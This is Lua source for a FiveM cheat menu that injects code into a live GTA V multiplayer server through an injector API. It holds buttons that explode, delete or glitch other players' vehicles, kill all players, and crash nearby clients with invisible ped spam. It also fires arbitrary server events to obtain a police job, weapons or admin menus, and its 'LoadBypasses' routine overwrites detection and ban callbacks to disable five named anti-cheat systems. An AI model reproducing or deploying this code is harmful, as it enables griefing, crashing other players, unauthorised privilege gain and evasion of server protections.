local attachCarVehicles = {"pounder2", "pounder", "mule", "phantom", "hauler", "mixer", "bus", "coach", "firetruck", "trashmaster", "benson", "stockade", "brickade", "rhino", "insurgent", "luxor2"}
playerVehicleMenu:AddOptions("Attach Car", attachCarVehicles, function(val)
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    Utils.InjectScript("attachCarToPlayer", nil, targetId, val)
    if ShowNotification then ShowNotification("Attach Car", "Attached " .. val .. " to player " .. targetId, "warning", 2000) end
end)

playerVehicleMenu:AddButton("Glitch Vehicle", function()
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    Utils.InjectScript("glitchVehicle", nil, targetId)
    if ShowNotification then ShowNotification("Glitch Vehicle", "Glitched vehicle for player " .. targetId, "warning", 2000) end
end)

playerVehicleMenu:AddButton("Kick From Vehicle", function()
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    KickFromVehicle(GetPlayerFromServerId(targetId))
    if ShowNotification then ShowNotification("Kick From Vehicle", "Kicked player " .. targetId .. " from vehicle", "warning", 2000) end
end)

playerVehicleMenu:AddButton("Delete Vehicle", function()
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    KickFromVehicle(GetPlayerFromServerId(targetId), true)
    if ShowNotification then ShowNotification("Delete Vehicle", "Deleted vehicle for player " .. targetId, "warning", 2000) end
end)

playerVehicleMenu:AddButton("Explode Vehicle", function()
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    KickFromVehicle(GetPlayerFromServerId(targetId), false, false, true)

    if ShowNotification then ShowNotification("Explode Vehicle", "Exploded vehicle for player " .. targetId, "warning", 2000) end
end)

playerVehicleMenu:AddButton("Fuck Vehicle", function()
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    KickFromVehicle(GetPlayerFromServerId(targetId), false, true, false)

    if ShowNotification then ShowNotification("Fuck Vehicle", "Exploded vehicle for player " .. targetId, "warning", 2000) end
end)

-- Entity Attachment
local playerEntityMenu = PLAYERS:AddCategory("Entity")

local attachEntities = {
    "random", "prop_cs1_14b_traind", "prop_barrier_work05", "prop_dumpster_01a",
    "prop_roadcone02a", "prop_bench_01a", "prop_parking_meter_01", "prop_fire_hydrant_1",
    "prop_bin_01a", "prop_container_01a", "prop_elecbox_12", "prop_rub_trolley01",
    "prop_roadcone01a", "prop_roadpole_01a", "prop_skip_01a", "prop_portaloo_01a",
    "prop_container_ld_d", "prop_cementbags01", "prop_barrier_work06", "prop_traffic_01a",
    "prop_sign_road_01a"
}
playerEntityMenu:AddOptions("Attach Entity", attachEntities, function(val)
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    Utils.InjectScript("attachEntityToPlayer", nil, targetId, val)
    if ShowNotification then ShowNotification("Attach Entity", "Attached " .. val .. " to player " .. targetId, "warning", 2000) end
end)

local SERVER = MENU:NewMultiCategory("Resource's")
local resources = SERVER:AddCategory("Resources")

for i = 0, GetNumResources(), 1 do
    local resource_name = GetResourceByFindIndex(i)

    if resource_name and GetResourceState(resource_name) == "started" then
        resources:AddOptions(resource_name, { "Start", "Stop" }, function(value)
            if value == "Stop" then
                Susano.StopResource(resource_name)
                if ShowNotification then ShowNotification("Resource", resource_name .. " stopped", "warning", 2000) end
                return
            end

            if value == "Start" then
                Susano.StartResource(resource_name)
                if ShowNotification then ShowNotification("Resource", resource_name .. " started", "success", 2000) end
                return
            end
        end, 2)
    end
end

-- Exploits Category
local EXPLOITS = MENU:NewCategory("Exploits")

EXPLOITS:AddButton("Voice Exploit", function()
            Susano.InjectResource("any", [[
            local isSpawning = false 
local hasRun = false 


function GetClosestPlayer()
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    local closestPlayer = -1
    local closestDistance = math.huge

    for _, playerId in ipairs(GetActivePlayers()) do
        if playerId ~= PlayerId() then -- Exclude the local player
            local targetPed = GetPlayerPed(playerId)
            if DoesEntityExist(targetPed) and NetworkIsPlayerActive(playerId) then
                local targetCoords = GetEntityCoords(targetPed)
                local distance = #(playerCoords - targetCoords)
                if distance < closestDistance then
                    closestDistance = distance
                    closestPlayer = playerId
                end
            end
        end
    end

    return closestPlayer
end


function ForceDeleteAllPeds(spawnedPeds, pedModel)
    for _, ped in ipairs(spawnedPeds) do
        if DoesEntityExist(ped) then
            DeleteEntity(ped)
        end
    end
    if pedModel then
        SetModelAsNoLongerNeeded(pedModel)
    end
end


function SpawnPedsAtPlayer2()
    if isSpawning or hasRun then return end
    isSpawning = true
    hasRun = true

    local playerPed = PlayerPedId()
    local selectedPlayer = GetClosestPlayer()

    if selectedPlayer == -1 then
        isSpawning = false
        hasRun = false
        return
    end

    local targetPed = GetPlayerPed(selectedPlayer)

    if DoesEntityExist(targetPed) and targetPed ~= playerPed and NetworkIsPlayerActive(selectedPlayer) then
        local pedModel = GetHashKey("cs_wade")
        RequestModel(pedModel)
        while not HasModelLoaded(pedModel) do
            Citizen.Wait(100)
        end

        local spawnedPeds = {}
        local maxPedsPerBatch = 5
        local maxIterations = 22

        for i = 0, maxIterations - 1 do
            targetPed = GetPlayerPed(selectedPlayer)
            if not DoesEntityExist(targetPed) or not NetworkIsPlayerActive(selectedPlayer) then
                ForceDeleteAllPeds(spawnedPeds, pedModel)
                break
            end

            local coords = GetEntityCoords(targetPed)
            if not coords then
                ForceDeleteAllPeds(spawnedPeds, pedModel)
                break
            end

            for j = 1, maxPedsPerBatch do
                local offsetX = math.random(-3.0, 3.0)
                local offsetY = math.random(-3.0, 3.0)
                local foundGround, groundZ = GetGroundZFor_3dCoord(coords.x + offsetX, coords.y + offsetY, coords.z + 2.0)
                local spawnZ = foundGround and groundZ or coords.z
                local ped = CreatePed(28, pedModel, coords.x + offsetX, coords.y + offsetY, spawnZ, math.random(0, 360), true, false)
                if DoesEntityExist(ped) then
                    SetEntityAlpha(ped, 0, false)
                    SetEntityVisible(ped, false, false)
                    FreezeEntityPosition(ped, true)
                    SetEntityCompletelyDisableCollision(ped, false, false)
                    SetEntityCollision(ped, false, false)
                    SetEntityNoCollisionEntity(ped, playerPed, true)
                    SetEntityNoCollisionEntity(playerPed, ped, true)
                    SetEntityNoCollisionEntity(ped, ped, true)
                    SetPedConfigFlag(ped, 292, true)
                    SetPedConfigFlag(ped, 301, true)
                    SetPedConfigFlag(ped, 128, true)
                    SetPedConfigFlag(ped, 287, true)
                    SetEntityCanBeDamaged(ped, false)
                    SetEntityInvincible(ped, true)
                    SetEntityProofs(ped, true, true, true, true, true, true, true, true)
                    SetPedCanRagdoll(ped, false)
                    SetPedCanRagdollFromPlayerImpact(ped, false)
                    SetPedConfigFlag(ped, 17, true)
                    SetPedConfigFlag(ped, 297, true)
                    SetPedConfigFlag(ped, 281, true)
                    SetPedConfigFlag(ped, 435, true)
                    SetPedConfigFlag(ped, 430, true)
                    SetPedConfigFlag(ped, 223, true)
                    SetPedConfigFlag(ped, 229, true)
                    SetPedConfigFlag(ped, 149, true)
                    SetBlockingOfNonTemporaryEvents(ped, true)
                    SetPedFleeAttributes(ped, 0, false)
                    SetPedCombatAttributes(ped, 46, false)
                    SetPedCombatAttributes(ped, 5, false)
                    SetPedCombatAttributes(ped, 17, false)
                    SetPedCombatAttributes(ped, 0, false)
                    SetPedCombatAbility(ped, 0)
                    SetPedCombatRange(ped, 0)
                    SetPedCombatMovement(ped, 0)
                    SetPedAsEnemy(ped, false)
                    DisablePedPainAudio(ped, true)
                    SetPedMute(ped, true)
                    SetAudioFlag("DisablePedSpeech", true)
                    StopPedSpeaking(ped, true)
                    SetPedSeeingRange(ped, 0.0)
                    SetPedHearingRange(ped, 0.0)
                    SetPedAlertness(ped, 0)
                    TaskWanderInArea(ped, coords.x, coords.y, spawnZ, 10.0, 10.0, 10.0)
                    SetPedAsNoLongerNeeded(ped)
                    table.insert(spawnedPeds, ped)
                end
            end
            Citizen.Wait(250)
        end
        SetModelAsNoLongerNeeded(pedModel)


        Citizen.CreateThread(function()
            Citizen.Wait(3000)
            ForceDeleteAllPeds(spawnedPeds, pedModel)
            isSpawning = false
            hasRun = false
        end)
    else
     
        isSpawning = false
        hasRun = false
    end
end


Citizen.CreateThread(function()
    SpawnPedsAtPlayer2()
end)

            ]])
    if ShowNotification then ShowNotification("Crash Nearby", "Crashed Nearby", "success", 2000) end
end)

EXPLOITS:AddToggle("Kill All", function(val)
    if val then
        if _G.__killAllNearbyRunning then return end
        _G.__killAllNearbyRunning = true
        Utils.InjectScript("killAllPlayers", nil, val)
        if ShowNotification then ShowNotification("Kill All", "Enabled", "warning", 2000) end
    else
        _G.__killAllNearbyRunning = false
        if ShowNotification then ShowNotification("Kill All", "Disabled", "info", 2000) end
    end
end, false)

EXPLOITS:AddToggle("RC Car", function(val)
    if val then
        MENU:InputBox("RC_CAR_MODEL", function(vehicleModel)
            if vehicleModel and vehicleModel ~= "" then
                Utils.InjectScript("startRCCar", nil, vehicleModel)
                if ShowNotification then ShowNotification("RC Car", "RC Car enabled with model: " .. vehicleModel, "success", 2000) end
            end
        end, false)
    else
        Utils.InjectScript("stopRCCar")
        if ShowNotification then ShowNotification("RC Car", "RC Car disabled", "info", 2000) end
    end
end, false)

local attachCarVehiclesExploit = {"luxor2", "banshee", "bullet", "cheetah", "entityxf", "infernus", "monroe", "stinger", "stingergt", "superd", "surano", "vacca", "voltic", "zentorno"}
EXPLOITS:AddOptions("Attach Car To Everyone", attachCarVehiclesExploit, function(val)
    Utils.InjectScript("attachCarToEveryone", nil, val)
    if ShowNotification then ShowNotification("Attach Car", "Attached " .. val .. " to everyone", "warning", 2000) end
end)

local attachEntityExploit = {"random", "prop_cs1_14b_traind", "prop_barrier_work05", "prop_dumpster_01a", "prop_roadcone02a", "prop_bench_01a", "prop_parking_meter_01", "prop_fire_hydrant_1", "prop_bin_01a", "prop_container_01a", "prop_elecbox_12", "prop_rub_trolley01", "prop_roadcone01a", "prop_roadpole_01a", "prop_skip_01a"}
EXPLOITS:AddOptions("Attach Entity To Everyone", attachEntityExploit, function(val)
    Utils.InjectScript("attachEntityToEveryone", nil, val)
    if ShowNotification then ShowNotification("Attach Entity", "Attached " .. val .. " to everyone", "warning", 2000) end
end)

EXPLOITS:AddButton("Voice Exploit", function()
    Utils.InjectScript("voiceExploit")
    if ShowNotification then ShowNotification("Voice Exploit", "Voice exploit activated", "success", 2000) end
end)

EXPLOITS:AddButton("Launch All Players", function()
    Utils.InjectScript("glitchAllPlayers")
    if ShowNotification then ShowNotification("Launch All Players", "All players launched", "warning", 2000) end
end)

-- Locations Category
local LOCATIONS = MENU:NewCategory("Locations")

LOCATIONS:AddButton("TP To Waypoint", function()
    Utils.InjectScript("tpToWaypoint")
    if ShowNotification then ShowNotification("TP To Waypoint", "Teleported to waypoint", "success", 2000) end
end)

LOCATIONS:AddDivider("Locations")

LOCATIONS:AddButton("Maze Bank", function()
    Utils.InjectScript("teleportToCoords", nil, -75.24, -818.95, 326.1)
    if ShowNotification then ShowNotification("Maze Bank", "Teleported to Maze Bank", "success", 2000) end
end)

LOCATIONS:AddButton("FIB Building", function()
    Utils.InjectScript("teleportToCoords", nil, 140.43, -750.52, 258.15)
    if ShowNotification then ShowNotification("FIB Building", "Teleported to FIB Building", "success", 2000) end
end)

LOCATIONS:AddButton("Mission Row PD", function()
    Utils.InjectScript("teleportToCoords", nil, 425.1, -979.5, 30.7)
    if ShowNotification then ShowNotification("Mission Row PD", "Teleported to Mission Row PD", "success", 2000) end
end)

LOCATIONS:AddButton("Pillbox Hospital", function()
    Utils.InjectScript("teleportToCoords", nil, 308.6, -595.3, 43.28)
    if ShowNotification then ShowNotification("Pillbox Hospital", "Teleported to Pillbox Hospital", "success", 2000) end
end)

LOCATIONS:AddButton("Del Perro Pier", function()
    Utils.InjectScript("teleportToCoords", nil, -1632.87, -1007.81, 13.07)
    if ShowNotification then ShowNotification("Del Perro Pier", "Teleported to Del Perro Pier", "success", 2000) end
end)

LOCATIONS:AddButton("Grove Street", function()
    Utils.InjectScript("teleportToCoords", nil, 109.63, -1943.14, 20.80)
    if ShowNotification then ShowNotification("Grove Street", "Teleported to Grove Street", "success", 2000) end
end)

LOCATIONS:AddButton("Legion Square", function()
    Utils.InjectScript("teleportToCoords", nil, 229.21, -871.61, 30.49)
    if ShowNotification then ShowNotification("Legion Square", "Teleported to Legion Square", "success", 2000) end
end)

LOCATIONS:AddButton("LS Customs", function()
    Utils.InjectScript("teleportToCoords", nil, -365.4, -131.8, 37.7)
    if ShowNotification then ShowNotification("LS Customs", "Teleported to LS Customs", "success", 2000) end
end)

LOCATIONS:AddButton("Mirror Park", function()
    Utils.InjectScript("teleportToCoords", nil, 1039.2, -765.3, 57.9)
    if ShowNotification then ShowNotification("Mirror Park", "Teleported to Mirror Park", "success", 2000) end
end)

LOCATIONS:AddButton("Vespucci Beach", function()
    Utils.InjectScript("teleportToCoords", nil, -1223.8, -1516.6, 4.4)
    if ShowNotification then ShowNotification("Vespucci Beach", "Teleported to Vespucci Beach", "success", 2000) end
end)

LOCATIONS:AddButton("Vinewood", function()
    Utils.InjectScript("teleportToCoords", nil, 293.2, 180.5, 104.3)
    if ShowNotification then ShowNotification("Vinewood", "Teleported to Vinewood", "success", 2000) end
end)

LOCATIONS:AddButton("Sandy Shores", function()
    Utils.InjectScript("teleportToCoords", nil, 1843.10, 3707.60, 33.52)
    if ShowNotification then ShowNotification("Sandy Shores", "Teleported to Sandy Shores", "success", 2000) end
end)

local TRIGGERS = MENU:NewCategory("Triggers")

TRIGGERS:AddButton("Custom Client Trigger", function()
    MENU:InputBox("EVENT_NAME", function(eventName)
        if eventName and eventName ~= "" then
            MENU:InputBox("PAYLOAD", function(payload)
                local luaPayload = ""
                if payload and payload ~= "" then
                    luaPayload = ", " .. payload
                end
                Utils.InjectScript("triggerClientEvent", nil, eventName, luaPayload)
                if ShowNotification then ShowNotification("Custom Client Trigger", "Triggered: " .. eventName .. (payload ~= "" and " with payload" or ""), "success", 2000) end
            end, false)
        end
    end, false)
end)

-- Custom Server Trigger
TRIGGERS:AddButton("Custom Server Trigger", function()
    MENU:InputBox("EVENT_NAME", function(eventName)
        if eventName and eventName ~= "" then
            MENU:InputBox("PAYLOAD", function(payload)
                local luaPayload = ""
                if payload and payload ~= "" then
                    luaPayload = ", " .. payload
                end
                Utils.InjectScript("triggerServerEvent", nil, eventName, luaPayload)
                if ShowNotification then ShowNotification("Custom Server Trigger", "Triggered: " .. eventName .. (payload ~= "" and " with payload" or ""), "success", 2000) end
            end, false)
        end
    end, false)
end)

-- Format Event Name & Payload
TRIGGERS:AddButton("Format Event Name & Payload", function()
    MENU:InputBox("EVENT_CODE", function(eventCode)
        if eventCode and eventCode ~= "" then
            local eventName = ""
            local payload = ""
            
            if string.find(eventCode, "TriggerServerEvent") then
                eventName = string.match(eventCode, 'TriggerServerEvent%s*%(%s*"([^"]+)"')
                if not eventName then
                    eventName = string.match(eventCode, "TriggerServerEvent%s*%(%s*'([^']+)'")
                end
            elseif string.find(eventCode, "TriggerEvent") then
                eventName = string.match(eventCode, 'TriggerEvent%s*%(%s*"([^"]+)"')
                if not eventName then
                    eventName = string.match(eventCode, "TriggerEvent%s*%(%s*'([^']+)'")
                end
            end
            
            if eventName and eventName ~= "" then
                print("Event Name: " .. eventName)
                print("Payload: " .. (payload ~= "" and payload or "None"))
                if ShowNotification then ShowNotification("Format Name & Payload", "Look in F8 console for formatted output", "success", 2000) end
            else
                if ShowNotification then ShowNotification("Format Name & Payload", "Could not extract event name", "error", 2000) end
            end
        end
    end, false)
end)

TRIGGERS:AddDivider("Triggers")

-- Specific triggers (conditional based on resource state)
if GetResourceState("scripts") == "started" then
    TRIGGERS:AddButton("Comserv End (-5)", function()
        Utils.InjectScript("comservEnd", "scripts")
        if ShowNotification then ShowNotification("Comserv End", "Comserv end trigger activated", "success", 2000) end
    end)
end

if GetResourceState("es_extended") == "started" then
    TRIGGERS:AddButton("Give ESX Job (Police)", function()
        Utils.InjectScript("giveESXJob", "es_extended", "police")
        if ShowNotification then ShowNotification("Give ESX Job", "Give esx job police trigger activated", "success", 2000) end
    end)
end

if GetResourceState("ElectronAC") == "started" then
    TRIGGERS:AddButton("Open Admin Menu (ElectronAC)", function()
        Utils.InjectScript("openElectronACMenu", "ElectronAC")
        if ShowNotification then ShowNotification("Open Admin Menu", "Open admin menu trigger activated", "success", 2000) end
    end)
end

if GetResourceState("scripts") == "started" then
    TRIGGERS:AddButton("Revive (Custom)", function()
        Utils.InjectScript("reviveCustom", "scripts")
        if ShowNotification then ShowNotification("Revive", "Revive trigger activated", "success", 2000) end
    end)
end

if GetResourceState("wasabi_ambulance") == "started" then
    TRIGGERS:AddButton("Give Pistol", function()
        Utils.InjectScript("givePistol", "wasabi_ambulance")
        if ShowNotification then ShowNotification("Give Pistol", "Give pistol trigger activated", "success", 2000) end
    end)
end

if GetResourceState("frp-ambulance") == "started" then
    TRIGGERS:AddButton("Revive Trigger", function()
        Utils.InjectScript("reviveTrigger", "frp-ambulance")
        if ShowNotification then ShowNotification("Revive Trigger", "Revive trigger activated", "success", 2000) end
    end)
end

if GetResourceState("orp-ambulance") == "started" then
    TRIGGERS:AddButton("Revive Trigger 2", function()
        Utils.InjectScript("reviveTrigger2", "orp-ambulance")
        if ShowNotification then ShowNotification("Revive Trigger", "Revive trigger activated", "success", 2000) end
    end)
end

local SETTINGS = MENU:NewCategory("Settings")
SETTINGS:AddOptions("Tab Switch Keys", { "Q/E", "A/E" }, function(val)
    if val == "Q/E" then
        MENU.tabSwitchKeys = "QE"
    elseif val == "A/E" then
        MENU.tabSwitchKeys = "AE"
    end
    if ShowNotification then ShowNotification("Tab Keys", "Changed to " .. val, "success", 2000) end
end, 1)

SETTINGS:AddOptions("Theme", { "Red Theme", "Pink Theme", "Trump Theme", "Green Theme" }, function(val)
    local themeMap = {
        ["Red Theme"] = "red",
        ["Pink Theme"] = "pink",
        ["Trump Theme"] = "trump",
        ["Green Theme"] = "green"
    }
    local themeName = themeMap[val]
    if themeName then
        ApplyTheme(themeName)
        local theme = THEME_DATA[themeName]
        if theme and ShowNotification then
            ShowNotification("Theme", "Changed to " .. theme.name, "success", 3000)
        end
    end
end, 1)

SETTINGS:AddButton("FPS Booster", function()
                        SetTimecycleModifier()
                        ClearTimecycleModifier()
                        ClearExtraTimecycleModifier()

                        local ped = PlayerPedId()
                        SetTimecycleModifier('yell_tunnel_nodirect')
                        ClearAllBrokenGlass()
                        ClearAllHelpMessages()
                        LeaderboardsReadClearAll()
                        ClearBrief()
                        ClearGpsFlags()
                        ClearPrints()
                        ClearSmallPrints()
                        ClearReplayStats()
                        LeaderboardsClearCacheData()
                        ClearFocus()
                        ClearHdArea()
                        ClearPedBloodDamage(PlayerPedId())
                        ClearPedWetness(PlayerPedId())
                        ClearPedEnvDirt(PlayerPedId())
                        ResetPedVisibleDamage(PlayerPedId())
                        ClearOverrideWeather()
                        DisableScreenblurFade()
                        SetRainLevel(0.0)
                        SetWindSpeed(0.0)
                        ClearOverrideWeather()
                        ClearWeatherTypePersist()
                        SetWeatherTypePersist("CLEAR")
                        SetWeatherTypeNow("CLEAR")
                        SetWeatherTypeNowPersist("CLEAR")
                
                        
                        SetForceVehicleTrails(false)
                        SetForcePedFootstepsTracks(false)
                        SetSnowLevel(0.0)
                        SetRainLevel(0.0)
                        SetWindSpeed(0.0)
                
                   
                        RemoveNamedPtfxAsset("core_snow")
                        UseParticleFxAsset("core")
        if ShowNotification then ShowNotification("Fps Booster", "Low FPS boost applied", "success", 2000) end

end)


SETTINGS:AddButton("Set Hotkey", function()
    MENU:InputBox("HOTKEY", function(val)
        MENU.hotkey = val
        if ShowNotification then ShowNotification("Hotkey", "Hotkey set to " .. val, "success", 2000) end
    end, true)
end)

SETTINGS:AddToggle("Show Banner", function(val)
    _G.SHOW_BANNER = val
    if not val then
        -- Hide banner immediately
        if THEME["Banners"] then
            THEME["Banners"][1] = nil
        end
        _G.SELECTEDBANNER = nil
        if ShowNotification then ShowNotification("Banner", "Banner hidden", "info", 2000) end
    else
        -- Show banner - reload from current theme
        if THEME_DATA then
            local currentTheme = nil
            local currentThemeName = nil
            
            -- Find current theme by color match
            if THEME["SelectedColor"] then
            for themeName, theme in pairs(THEME_DATA) do
                    if theme.selectedColor then
                        local selColor = THEME["SelectedColor"]
                        if type(selColor) == "table" and type(theme.selectedColor) == "table" then
                            if selColor[1] == theme.selectedColor[1] and 
                               selColor[2] == theme.selectedColor[2] and 
                               selColor[3] == theme.selectedColor[3] then
                    currentTheme = theme
                                currentThemeName = themeName
                    break
                end
            end
                    end
                end
            end
            
            -- If no theme found by color, default to red theme
            if not currentTheme then
                currentTheme = THEME_DATA["red"]
                currentThemeName = "red"
            end
            
            if currentTheme and currentTheme.bannerLink then
                local HTTPGET = HTTPGET or function(url)
                    local st, body = Susano.HttpGet(url)
                    return body
                end
                if Susano.LoadTextureFromBuffer then
                    -- Load banner synchronously if possible, otherwise in thread
                    local bannerData = HTTPGET(currentTheme.bannerLink)
                    if bannerData and bannerData ~= "" and #bannerData > 0 then
                        if not THEME["Banners"] then THEME["Banners"] = {} end
                        THEME["Banners"][1] = Susano.LoadTextureFromBuffer(bannerData)
                        _G.SELECTEDBANNER = 1
                        if ShowNotification then ShowNotification("Banner", "Banner shown", "success", 2000) end
                    else
                        -- Try async if sync fails
                        CreateThread(function()
                            Wait(100)
                            local bannerData = HTTPGET(currentTheme.bannerLink)
                            if bannerData and bannerData ~= "" and #bannerData > 0 then
                                if not THEME["Banners"] then THEME["Banners"] = {} end
                                THEME["Banners"][1] = Susano.LoadTextureFromBuffer(bannerData)
                                _G.SELECTEDBANNER = 1
                                if ShowNotification then ShowNotification("Banner", "Banner shown", "success", 2000) end
                            else
                                if ShowNotification then ShowNotification("Banner", "Failed to load banner", "error", 2000) end
                            end
                        end)
                    end
                else
                    if ShowNotification then ShowNotification("Banner", "LoadTextureFromBuffer not available", "error", 2000) end
                end
            else
                if ShowNotification then ShowNotification("Banner", "No theme banner available", "error", 2000) end
            end
        end
    end
end, true)

SETTINGS:AddButton("Rebind Open Key", function()
    if _G.startRebind then
        _G.startRebind()
        if ShowNotification then ShowNotification("Rebind Open Key", "Press a key to rebind", "info", 2000) end
    else
        if ShowNotification then ShowNotification("Rebind Open Key", "Rebind function not available", "error", 2000) end
    end
end)

SETTINGS:AddToggle("Show Keybinds HUD", function(val)
    _G.bindsVisible = val
    if ShowNotification then ShowNotification("Show Keybinds HUD", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, true)

SETTINGS:AddButton("Reset All Keybinds", function()
    if _G.keyToFeature then
        _G.keyToFeature = {}
        if ShowNotification then ShowNotification("Reset All Keybinds", "All keybinds reset", "success", 2000) end
    else
        if ShowNotification then ShowNotification("Reset All Keybinds", "Keybinds system not available", "error", 2000) end
    end
end)

SETTINGS:AddToggle("Block Binded Keybinds", function(val)
    _G.blockBindedKeybinds = val
    if ShowNotification then ShowNotification("Block Binded Keybinds", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)
]======])()


-- Load bypasses
MENU.debug_info = false
local function LoadBypasses()
    local AnitCheats = Utils.GetAntiCheats();

    for _, v in pairs(AnitCheats) do
        if v[1] == "ReaperV4" then
Susano.InjectResource(v[2] , [[
local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
for k, v in pairs(eventHandlersRaw) do
    if v.handlers then
        for x, y in pairs(v.handlers) do
            if k == "Reaper:NewDetection" then
                local func = y
                local idx = 2
                while true do
                    local name, value = debug.getupvalue(func, idx)
                    if not name then break end
                    if name == "_ENV" then
                        idx = idx + 1
                        return
                    end


                    if type(value) == "table" then
                        for i, v in pairs(value) do
                            if type(v) == "function" then
                                local name2, upv = debug.getupvalue(v, 1)
                                if name2 and type(upv) == "table" then
                                    if upv["encrypt_cache"] then
                                        --print("Found SecurityClient")
                                        upv.detection = function(...)
                                        end
                                        local securityclient = upv
                                        for name, detection in pairs(securityclient["active_detections"]) do
                                            if detection["detected"] then
                                                securityclient["active_detections"][name]["detected"] = function(...)
                                                end
                                            end

                                            if detection["callback"] then
                                                securityclient["active_detections"][name]["callback"] = function(...)
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end

                    idx = idx + 1
                end
            end
        end
    end
end
]])
        end

        if v[1] == "Fiveguard" then
            Susano.InjectResource(v[2], [[
                            local TableSpecials = {
                                ["print"] = true,
                                ["_G"] = true,
                                ["__VERSION"] = true,
                            }
                            _G["__VERSION"] = _G
                            for k, v in pairs(_G) do
                                if not TableSpecials[k] then
                                    _G[k] = function()
                                        oldWait(10000 * 10000)
                                    end
                                end
                            end
                        ]])
        end
        print(v[1])
        if v[1] == "WaveShield" then
            print("No WS bypass currently....")
        end

        if v[1] == "ElectronAC" then
            Susano.InjectResource(v[2], [[
                TriggerServerEvent = true
    TriggerLatentServerEvent = true

    for name, value in pairs(_G) do
        if type(value) == "table" and name ~= "_G" and name ~= "SetStateBagValue" then
            _G[name] = 1337
        end
    end
        ]], Susano.InjectionType.NO_THREAD)
        end

        if v[1] == "EagleAC" then
            Susano.InjectResource("EC_AC", [[
                print("Bypassed EagleAC")
                if not overWrite then print("Not EC_AC") end
                ECDetect = function(...)
                    local args = {...}
                    print("ECDetect", json.encode(args))
                end

                overWrite[tostring(ECDetect)] = "ECDetect"

                ECDetectLoader = function(...)
                    local args = {...}
                    print("ECDetectLoader", json.encode(args))
                end

                overWrite[tostring(ECDetectLoader)] = "ECDetectLoader"

                HasPerm = function(...)
                    local args = {...}
                    print("HasPerm", json.encode(args))
                    return true
                end

                overWrite[tostring(HasPerm)] = "HasPerm"
            ]])

            local function ResourceHasECAC(resource)
                if not GetResourceState(resource) == "started" then
                    return false
                end

                local rtn = false

                local amt = GetNumResourceMetadata(resource, "shared_script")
                if amt > 0 then
                    for idx = 0, amt - 1 do
                        local idk = GetResourceMetadata(resource,
                            "shared_script", idx)
                        if string.find(idk, "EC_AC/shared.lua") then
                            rtn = true
                            break
                        end
                    end
                end

                return rtn
            end

            local resourceList = {}
            for i = 0, GetNumResources(), 1 do
                local resource_name = GetResourceByFindIndex(i)
                if resource_name and GetResourceState(resource_name) ==
                    "started" then
                    if ResourceHasECAC(resource_name) then
                        Susano.InjectResource(resource_name, [[
                        if not CreateVehicle1 then return print("not injectable for eagle") end
                        for i, v in pairs(_G) do
                            if type(v) == "function" then
                                if type(_G[i..1]) == "function" then
                                    _G[i] = _G[i..1]
                                end

                                if type(_G[i..2]) == "function" then
                                    _G[i] = _G[i..2]
                                end
                            end
                        end
                        print("Patched")
                    ]])
                    end
                end
            end
        end
        if v[1] == "Cyber Anticheat" then
            Susano.InjectResource(v[2], [[
                ESX = nil
    QBCore = nil
    UseESX = false
    UseQBCore = false
    serverCallbacksReady = false
    configLoaded = false

    Shared = {}

    local org_TriggerServerEvent = TriggerServerEvent
    function TriggerServerEvent(eventName, ...)
        local args = { ... }

        if eventName == "CyberAnticheat:banHandler" and args[1] ~= "heartbeat" then
            CancelEvent()
            return
        end

        if eventName == "CyberAnticheat:TakeScreenshot2" then
            CancelEvent()
            return
        end

        if eventName == "CyberAnticheat:kickPlayer" then
            CancelEvent()
            return
        end

        if eventName ~= "CyberAnticheat:heartbeat" and eventName ~= "dsdjmashasdjhasdghjkasdhjgdasghjkdasghjkdasghjksdjghsdhbjkddasdaaaaas" and eventName ~= "CyberAnticheat:stealthCheck" and not string.find(args[1], "heartbeat") then
           CancelEvent()
            return
        end

        org_TriggerServerEvent(eventName, ...)
    end

    function DeleteEntity(entity)
        return
    end

    local org_GetCurrentResourceName = GetCurrentResourceName
    function GetCurrentResourceName()
        local originalName = org_GetCurrentResourceName()
        if originalName == "CyberAnticheat" or originalName == nil then
            return "CyberAnticheat"
        end
        return originalName
    end

    print("Made a bypass in 5 mins btw")
            ]])
        end
    end
end

-- TODO: Wait till bypass really loaded.
LoadBypasses()


MENU:InputBox("HOTKEY", function(val)
    MENU.hotkey = val
end, true)

local hexToColorTable = function(hex)
    local n = hex
    if n <= 0xFFFFFF then
        local r = math.floor(n / 65536) % 256
        local g = math.floor(n / 256) % 256
        local b = n % 256
        return { r, g, b, 255 }
    else
        local a = n % 256
        local b = math.floor(n / 256) % 256
        local g = math.floor(n / 65536) % 256
        local r = math.floor(n / 16777216) % 256
        return { r, g, b, a }
    end
end

local ScreenWidth, ScreenHeight = GetActiveScreenResolution()
function ScreenScale(h)
    local h = h or 1
    return h * (ScreenHeight / 1080.0)
end

THEME                              = {}
THEME["SelectedColor"]             = { 242, 141, 241, 180 }
THEME["background"]                = hexToColorTable(0x1a1a1a)
